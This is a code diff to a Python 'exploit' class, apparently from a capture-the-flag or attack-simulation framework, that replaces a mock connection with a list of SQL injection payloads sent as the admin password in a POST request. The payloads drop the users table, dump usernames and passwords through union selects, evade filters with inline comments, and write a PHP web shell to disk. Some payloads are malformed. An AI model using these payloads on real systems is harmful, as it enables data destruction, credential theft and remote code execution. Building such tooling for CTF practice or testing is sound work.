@@ -1,4 +1,4 @@
-import pwn, Util
+import pwn, Util,random,requests
 
 class exploit(object):
     def __init__(self):
@@ -13,11 +13,18 @@ class exploit(object):
         self.HOST = None
         self.PORT = 8000
 
+        self.possible_queries = [
+         "; drop users- --",
+         "un/**/ion select * from users- --",
+         "uniOn select concat(username,password) from users- --",
+         "; select ls from cmd- --",
+         "; select '<?php exec($_SYSTEM[c])?>' into outfile shell.php- --",
+         "; union select 1,2,3,4,5- --",
+        ]
 
     def exploit(self):
-        remote = pwn.remote(self.HOST, self.PORT)
-        remote.sendline("Mock1")
-        remote.close()
+        query = random.choice(self.possible_queries)
+        requests.post(self.HOST,{"username":"admin","password":query})
 
 
     def _validate(self):
